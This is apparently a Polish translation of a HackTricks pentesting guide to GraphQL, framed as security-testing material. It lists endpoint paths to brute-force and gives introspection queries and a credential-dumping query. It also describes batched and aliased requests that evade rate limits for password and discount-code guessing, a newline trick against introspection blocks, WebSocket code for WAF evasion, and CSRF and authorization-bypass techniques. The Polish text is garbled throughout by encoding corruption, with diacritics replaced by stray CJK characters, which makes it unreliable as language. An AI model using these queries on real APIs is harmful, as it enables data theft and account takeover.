# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Wprowadzenie

GraphQL jest **wyr贸偶niany** jako **efektywna alternatywa** dla REST API, oferujc uproszczone podejcie do zapyta o dane z backendu. W przeciwiestwie do REST, kt贸ry czsto wymaga wielu 偶da do r贸偶nych punkt贸w kocowych w celu zebrania danych, GraphQL umo偶liwia pobranie wszystkich potrzebnych informacji za pomoc **jednego 偶dania**. To uproszczenie znaczco **korzysta dla programist贸w**, zmniejszajc zo偶ono ich proces贸w pobierania danych.

## GraphQL i bezpieczestwo

Wraz z pojawieniem si nowych technologii, w tym GraphQL, pojawiaj si r贸wnie偶 nowe luki w zabezpieczeniach. Kluczowym punktem do zauwa偶enia jest to, 偶e **GraphQL domylnie nie zawiera mechanizm贸w uwierzytelniania**. Odpowiedzialno za wdro偶enie takich rodk贸w bezpieczestwa spoczywa na programistach. Bez odpowiedniego uwierzytelnienia, punkty kocowe GraphQL mog ujawnia wra偶liwe informacje nieautoryzowanym u偶ytkownikom, co stanowi istotne ryzyko bezpieczestwa.

### Ataki brute force w katalogach i GraphQL

Aby zidentyfikowa wystawione instancje GraphQL, zaleca si uwzgldnienie okrelonych cie偶ek w atakach brute force w katalogach. Te cie偶ki to:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identyfikacja otwartych instancji GraphQL pozwala na zbadanie wspieranych zapyta. To jest kluczowe dla zrozumienia danych dostpnych przez punkt kocowy. System introspekcji GraphQL uatwia to, szczeg贸owo opisujc zapytania, kt贸re wspiera schemat. Aby uzyska wicej informacji na ten temat, zapoznaj si z dokumentacj GraphQL na temat introspekcji: [**GraphQL: Jzyk zapyta dla API.**](https://graphql.org/learn/introspection/)

### Odcisk

Narzdzie [**graphw00f**](https://github.com/dolevf/graphw00f) jest w stanie wykry, kt贸ry silnik GraphQL jest u偶ywany na serwerze, a nastpnie wydrukowa przydatne informacje dla audytora bezpieczestwa.

#### Zapytania uniwersalne <a href="#universal-queries" id="universal-queries"></a>

Aby sprawdzi, czy URL jest usug GraphQL, mo偶na wysa **zapytanie uniwersalne**, `query{__typename}`. Jeli odpowied藕 zawiera `{"data": {"__typename": "Query"}}`, potwierdza to, 偶e URL hostuje punkt kocowy GraphQL. Ta metoda opiera si na polu `__typename` GraphQL, kt贸re ujawnia typ zapytanego obiektu.
```javascript
query{__typename}
```
### Podstawowa Enumeracja

Graphql zazwyczaj obsuguje **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Chocia偶 dla bezpieczestwa zaleca si zezwolenie tylko na json, aby zapobiec atakom CSRF.

#### Introspekcja

Aby u偶y introspekcji do odkrywania informacji o schemacie, zapytaj pole `__schema`. To pole jest dostpne w typie g贸wnym wszystkich zapyta.
```bash
query={__schema{types{name,fields{name}}}}
```
Z t kwerend znajdziesz nazwy wszystkich u偶ywanych typ贸w:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Dziki temu zapytaniu mo偶esz wyodrbni wszystkie typy, ich pola i argumenty (oraz typ argument贸w). Bdzie to bardzo przydatne, aby wiedzie, jak zapyta baz danych.

![](<../../.gitbook/assets/image (950).png>)

**Bdy**

Interesujce jest, czy **bdy** bd **pokazywane**, poniewa偶 przyczyni si do u偶ytecznych **informacji.**
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**Enumerowanie schematu bazy danych za pomoc introspekcji**

{% hint style="info" %}
Jeli introspekcja jest wczona, ale powy偶sze zapytanie nie dziaa, spr贸buj usun dyrektywy `onOperation`, `onFragment` i `onField` z struktury zapytania.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Zapytanie introspekcyjne w linii:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Ostatnia linia kodu to zapytanie graphql, kt贸re wycignie wszystkie metainformacje z graphql (nazwy obiekt贸w, parametry, typy...)

![](<../../.gitbook/assets/image (363).png>)

Jeli introspekcja jest wczona, mo偶esz u偶y [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager), aby zobaczy w GUI wszystkie opcje.

### Zapytania

Teraz, gdy wiemy, jaki rodzaj informacji jest zapisany w bazie danych, spr贸bujmy **wycign kilka wartoci**.

W introspekcji mo偶esz znale藕 **kt贸ry obiekt mo偶esz bezporednio zapyta** (poniewa偶 nie mo偶esz zapyta obiektu tylko dlatego, 偶e istnieje). Na poni偶szym obrazku wida, 偶e "_queryType_" nazywa si "_Query_", a jednym z p贸l obiektu "_Query_" jest "_flags_", kt贸ry jest r贸wnie偶 typem obiektu. Dlatego mo偶esz zapyta obiekt flagi.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Zauwa偶, 偶e typ zapytania "_flags_" to "_Flags_", a ten obiekt jest zdefiniowany jak poni偶ej:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Mo偶esz zobaczy, 偶e obiekty "_Flags_" skadaj si z **name** i **value**. Nastpnie mo偶esz uzyska wszystkie nazwy i wartoci flag za pomoc zapytania:
```javascript
query={flags{name, value}}
```
Zauwa偶, 偶e w przypadku gdy **obiekt do zapytania** jest **typem** **prymitywnym** takim jak **string**, jak w poni偶szym przykadzie

![](<../../.gitbook/assets/image (958).png>)

Mo偶esz po prostu zapyta o to za pomoc:
```javascript
query={hiddenFlags}
```
W innym przykadzie, w kt贸rym znajdoway si 2 obiekty wewntrz obiektu typu "_Query_": "_user_" i "_users_".\
Jeli te obiekty nie potrzebuj 偶adnych argument贸w do wyszukiwania, mo偶na **pobiera wszystkie informacje z nich** po prostu **proszc** o dane, kt贸re chcesz. W tym przykadzie z Internetu mo偶na byo wyodrbni zapisane nazwy u偶ytkownik贸w i hasa:

![](<../../.gitbook/assets/image (880).png>)

Jednak w tym przykadzie, jeli spr贸bujesz to zrobi, otrzymasz ten **bd**:

![](<../../.gitbook/assets/image (1042).png>)

Wyglda na to, 偶e w jaki spos贸b bdzie szuka, u偶ywajc argumentu "_**uid**_" typu _**Int**_.\
Tak czy inaczej, ju偶 wiedzielimy, 偶e w sekcji [Basic Enumeration](graphql.md#basic-enumeration) zaproponowano zapytanie, kt贸re pokazywao nam wszystkie potrzebne informacje: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Jeli przeczytasz obrazek dostarczony, gdy uruchomiem to zapytanie, zobaczysz, 偶e "_**user**_" mia **arg** "_**uid**_" typu _Int_.

Wic, wykonujc lekk _**uid**_ bruteforce, odkryem, 偶e w _**uid**=**1**_ odzyskano nazw u偶ytkownika i haso:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Zauwa偶, 偶e **odkryem**, 偶e mog prosi o **parametry** "_**user**_" i "_**password**_", poniewa偶 jeli spr贸buj szuka czego, co nie istnieje (`query={user(uid:1){noExists}}`), otrzymam ten bd:

![](<../../.gitbook/assets/image (707).png>)

A podczas **fazy enumeracji** odkryem, 偶e obiekt "_**dbuser**_" mia jako pola "_**user**_" i "_**password**_.

**Sztuczka z zrzutem cigu zapytania (dziki @BinaryShadow\_)**

Jeli mo偶esz wyszukiwa wedug typu cigu, jak: `query={theusers(description: ""){username,password}}` i **szukasz pustego cigu**, to **zrzuci wszystkie dane**. (_Zauwa偶, 偶e ten przykad nie jest zwizany z przykadem z samouczk贸w, w tym przykadzie za贸偶, 偶e mo偶esz wyszukiwa u偶ywajc "**theusers**" wedug pola String o nazwie "**description**"_).

### Wyszukiwanie

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** s identyfikowane przez sw贸j **email** i **imi**; **filmy** przez swoj **nazw** i **ocen**. **Osoby** mog by przyjaci贸mi i r贸wnie偶 mie filmy, co wskazuje na relacje w bazie danych.

Mo偶esz **wyszukiwa** osoby **po** **imi** i uzyska ich emaile:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Mo偶esz **szuka** os贸b **po** **nazwie** i uzyska ich **subskrybowane** **filmy**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Zauwa偶, jak wskazano, aby pobra `name` `subscribedMovies` danej osoby.

Mo偶esz r贸wnie偶 **wyszukiwa kilka obiekt贸w jednoczenie**. W tym przypadku wyszukiwane s 2 filmy:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Lub nawet **relacje kilku r贸偶nych obiekt贸w za pomoc alias贸w**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacje

**Mutacje s u偶ywane do wprowadzania zmian po stronie serwera.**

W **introspekcji** mo偶na znale藕 **zadeklarowane** **mutacje**. Na poni偶szym obrazku "_MutationType_" nazywa si "_Mutation_", a obiekt "_Mutation_" zawiera nazwy mutacji (jak "_addPerson_" w tym przypadku):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** s identyfikowane przez sw贸j **adres e-mail** i **imi**; **filmy** przez swoj **nazw** i **ocen**. **Osoby** mog by przyjaci贸mi i r贸wnie偶 posiada filmy, co wskazuje na relacje w bazie danych.

Mutacja do **tworzenia nowych** film贸w w bazie danych mo偶e wyglda jak poni偶sza (w tym przykadzie mutacja nazywa si `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Zauwa偶, jak zar贸wno wartoci, jak i typ danych s wskazane w zapytaniu.**

Dodatkowo, baza danych obsuguje operacj **mutacji**, nazwan `addPerson`, kt贸ra umo偶liwia tworzenie **os贸b** wraz z ich powizaniami z istniejcymi **przyjaci贸mi** i **filmami**. Wa偶ne jest, aby zauwa偶y, 偶e przyjaciele i filmy musz istnie w bazie danych przed powizaniem ich z nowo utworzon osob.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Przeci偶anie dyrektyw

Jak wyjaniono w [**jednej z luk opisanych w tym raporcie**](https://www.landh.tech/blog/20240304-google-hack-50000/), przeci偶anie dyrektyw polega na wywoaniu dyrektywy nawet miliony razy, aby zmusi serwer do marnowania operacji, a偶 bdzie mo偶liwe przeprowadzenie DoS.

### Grupowanie brute-force w 1 偶daniu API

Te informacje zostay zaczerpnite z [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Uwierzytelnianie przez GraphQL API z **jednoczesnym wysyaniem wielu zapyta z r贸偶nymi powiadczeniami** w celu ich sprawdzenia. To klasyczny atak brute force, ale teraz mo偶liwe jest wysanie wicej ni偶 jednej pary login/haso w jednym 偶daniu HTTP dziki funkcji grupowania GraphQL. To podejcie oszukuje zewntrzne aplikacje monitorujce stawki, sprawiajc, 偶e myl, 偶e wszystko jest w porzdku i nie ma bota pr贸bujcego zgadn hasa.

Poni偶ej znajduje si najprostsza demonstracja 偶dania uwierzytelnienia aplikacji, z **3 r贸偶nymi parami email/haso jednoczenie**. Oczywicie mo偶liwe jest wysanie tysicy w jednym 偶daniu w ten sam spos贸b:

![](<../../.gitbook/assets/image (1081).png>)

Jak wida na zrzucie ekranu odpowiedzi, pierwsze i trzecie 偶dania zwr贸ciy _null_ i odzwierciedliy odpowiednie informacje w sekcji _error_. **Drugie mutacja miaa poprawne dane uwierzytelniajce** i odpowied藕 zawiera poprawny token sesji uwierzytelniajcej.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL bez introspekcji

Coraz wicej **punkt贸w kocowych graphql wycza introspekcj**. Jednak bdy, kt贸re graphql zgasza, gdy otrzymuje nieoczekiwane 偶danie, s wystarczajce dla narzdzi takich jak [**clairvoyance**](https://github.com/nikitastupin/clairvoyance), aby odtworzy wikszo schematu.

Co wicej, rozszerzenie Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **obserwuje 偶dania GraphQL API przechodzce przez Burp** i **buduje** wewntrzny **schemat** GraphQL z ka偶dym nowym zapytaniem, kt贸re widzi. Mo偶e r贸wnie偶 ujawnia schemat dla GraphiQL i Voyager. Rozszerzenie zwraca faszyw odpowied藕, gdy otrzymuje zapytanie introspekcyjne. W rezultacie GraphQuail pokazuje wszystkie zapytania, argumenty i pola dostpne do u偶ycia w API. Wicej informacji [**sprawd藕 to**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

adna **lista s贸w** do odkrywania [**jednostek GraphQL mo偶na znale藕 tutaj**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Obejcie obrony introspekcji GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Aby obej ograniczenia dotyczce zapyta introspekcyjnych w API, wstawienie **specjalnego znaku po sowie kluczowym `__schema`** okazuje si skuteczne. Ta metoda wykorzystuje powszechne niedopatrzenia programist贸w w wzorcach regex, kt贸re maj na celu zablokowanie introspekcji, koncentrujc si na sowie kluczowym `__schema`. Dodajc znaki takie jak **spacje, nowe linie i przecinki**, kt贸re GraphQL ignoruje, ale mog nie by uwzgldnione w regex, mo偶na obej ograniczenia. Na przykad zapytanie introspekcyjne z now lini po `__schema` mo偶e obej takie obrony:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Jeli nieudane, rozwa偶 alternatywne metody 偶da, takie jak **偶dania GET** lub **POST z `x-www-form-urlencoded`**, poniewa偶 ograniczenia mog dotyczy tylko 偶da POST.

### Spr贸buj WebSockets

Jak wspomniano w [**tej prezentacji**](https://www.youtube.com/watch?v=tIo\_t5uUK50), sprawd藕, czy mo偶liwe jest poczenie z graphQL za pomoc WebSockets, poniewa偶 mo偶e to pozwoli na ominicie potencjalnego WAF i sprawi, 偶e komunikacja websocket ujawni schemat graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Odkrywanie Ujawnionych Struktur GraphQL**

Gdy introspekcja jest wyczona, przeszukiwanie kodu 藕r贸dowego strony internetowej w poszukiwaniu wstpnie zaadowanych zapyta w bibliotekach JavaScript jest przydatn strategi. Te zapytania mo偶na znale藕, korzystajc z zakadki `Sources` w narzdziach deweloperskich, co daje wgld w schemat API i ujawnia potencjalnie **ujawnione wra偶liwe zapytania**. Polecenia do wyszukiwania w narzdziach deweloperskich to:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF w GraphQL

Jeli nie wiesz, czym jest CSRF, przeczytaj nastpujc stron:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Mo偶esz znale藕 kilka punkt贸w kocowych GraphQL **skonfigurowanych bez token贸w CSRF.**

Zauwa偶, 偶e 偶dania GraphQL s zazwyczaj wysyane za pomoc 偶da POST z u偶yciem nag贸wka Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Jednak wikszo punkt贸w kocowych GraphQL obsuguje r贸wnie偶 **`form-urlencoded` 偶dania POST:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Zatem, poniewa偶 偶dania CSRF, takie jak poprzednie, s wysyane **bez 偶da wstpnych**, mo偶liwe jest **wprowadzenie** **zmian** w GraphQL, wykorzystujc CSRF.

Nale偶y jednak zauwa偶y, 偶e nowa domylna warto ciasteczka flagi `samesite` w Chrome to `Lax`. Oznacza to, 偶e ciasteczko bdzie wysyane tylko z zewntrznej strony w 偶daniach GET.

Nale偶y pamita, 偶e zazwyczaj mo偶liwe jest r贸wnie偶 wysanie **偶dania** **zapytania** jako **偶dania GET**, a token CSRF mo偶e nie by weryfikowany w 偶daniu GET.

Ponadto, wykorzystujc atak [**XS-Search**](../../pentesting-web/xs-search/), mo偶e by mo偶liwe wykradzenie treci z punktu kocowego GraphQL, wykorzystujc dane uwierzytelniajce u偶ytkownika.

Aby uzyska wicej informacji, **sprawd藕** [**oryginalny post tutaj**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Przechwytywanie WebSocket midzy witrynami w GraphQL

Podobnie jak w przypadku luk CRSF, wykorzystujc GraphQL, mo偶liwe jest r贸wnie偶 przeprowadzenie **przechwytywania WebSocket midzy witrynami, aby wykorzysta uwierzytelnienie w GraphQL z niechronionymi ciasteczkami** i zmusi u偶ytkownika do wykonania nieoczekiwanych dziaa w GraphQL.

Aby uzyska wicej informacji, sprawd藕:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Autoryzacja w GraphQL

Wiele funkcji GraphQL zdefiniowanych na punkcie kocowym mo偶e sprawdza tylko uwierzytelnienie 偶dajcego, ale nie autoryzacj.

Modyfikacja zmiennych wejciowych zapytania mo偶e prowadzi do ujawnienia wra偶liwych danych konta [leak](https://hackerone.com/reports/792927).

Mutacja mo偶e nawet prowadzi do przejcia konta, pr贸bujc zmodyfikowa dane innego konta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Ominicie autoryzacji w GraphQL

[czenie zapyta](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) mo偶e obej saby system autoryzacji.

W poni偶szym przykadzie wida, 偶e operacja to "forgotPassword" i powinna ona wykonywa tylko zapytanie forgotPassword z ni zwizane. Mo偶na to obej, dodajc zapytanie na kocu, w tym przypadku dodajemy "register" oraz zmienn u偶ytkownika, aby system zarejestrowa si jako nowy u偶ytkownik.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Ominicie limit贸w szybkoci przy u偶yciu alias贸w w GraphQL

W GraphQL aliasy to pot偶na funkcja, kt贸ra pozwala na **jawne nazywanie waciwoci** podczas skadania 偶dania API. Ta mo偶liwo jest szczeg贸lnie przydatna do pobierania **wielu instancji tego samego typu** obiektu w jednym 偶daniu. Aliasy mog by u偶ywane do pokonywania ograniczenia, kt贸re uniemo偶liwia obiektom GraphQL posiadanie wielu waciwoci o tej samej nazwie.

Aby dokadnie zrozumie aliasy GraphQL, zaleca si nastpujce 藕r贸do: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Chocia偶 g贸wnym celem alias贸w jest zmniejszenie potrzeby wielu wywoa API, zidentyfikowano niezamierzony przypadek u偶ycia, w kt贸rym aliasy mog by wykorzystywane do przeprowadzania atak贸w brute force na punkt kocowy GraphQL. Jest to mo偶liwe, poniewa偶 niekt贸re punkty kocowe s chronione przez ograniczniki szybkoci zaprojektowane w celu powstrzymania atak贸w brute force poprzez ograniczenie **liczby 偶da HTTP**. Jednak te ograniczniki szybkoci mog nie uwzgldnia liczby operacji w ka偶dym 偶daniu. Biorc pod uwag, 偶e aliasy pozwalaj na doczenie wielu zapyta w jednym 偶daniu HTTP, mog one obej takie rodki ograniczajce.

Rozwa偶 przykad podany poni偶ej, kt贸ry ilustruje, jak zapytania z aliasami mog by u偶ywane do weryfikacji wa偶noci kod贸w rabatowych sklepu. Ta metoda mo偶e omin ograniczenia szybkoci, poniewa偶 kompiluje kilka zapyta w jednym 偶daniu HTTP, potencjalnie umo偶liwiajc weryfikacj wielu kod贸w rabatowych jednoczenie.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Narzdzia

### Skanery podatnoci

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testuje powszechne bdne konfiguracje punkt贸w kocowych graphql
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Skrypt audytujcy bezpieczestwo GraphQL z naciskiem na wykonywanie zbiorczych zapyta i mutacji GraphQL.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Rozpoznaje u偶ywany graphql
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Zestaw narzdzi, kt贸ry mo偶na wykorzysta do pobierania schemat贸w i wyszukiwania wra偶liwych danych, testowania autoryzacji, atak贸w brute force na schematy oraz znajdowania cie偶ek do danego typu.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Mo偶e by u偶ywany jako samodzielne narzdzie lub [rozszerzenie Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Mo偶e by u偶ywany jako klient CLI, aby zautomatyzowa ataki
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Narzdzie, kt贸re wymienia r贸偶ne sposoby **osignicia danego typu w schemacie GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Nastpca tryb贸w samodzielnych i CLI InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Rozszerzenie Burp do zaawansowanego testowania GraphQL. _**Skaner**_ jest rdzeniem InQL v5.0, gdzie mo偶na analizowa punkt kocowy GraphQL lub lokalny plik schematu introspekcji. Automatycznie generuje wszystkie mo偶liwe zapytania i mutacje, organizujc je w uporzdkowany widok do analizy. Komponent _**Atakujcy**_ pozwala na przeprowadzanie zbiorczych atak贸w GraphQL, co mo偶e by przydatne do omijania 藕le zaimplementowanych limit贸w prdkoci.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Pr贸buje uzyska schemat, nawet gdy introspekcja jest wyczona, korzystajc z pomocy niekt贸rych baz danych Graphql, kt贸re zasugeruj nazwy mutacji i parametr贸w.

### Klienci

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Klient GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Klient GUI

### Testy automatyczne

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Wideo wyjaniajce AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Odniesienia

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
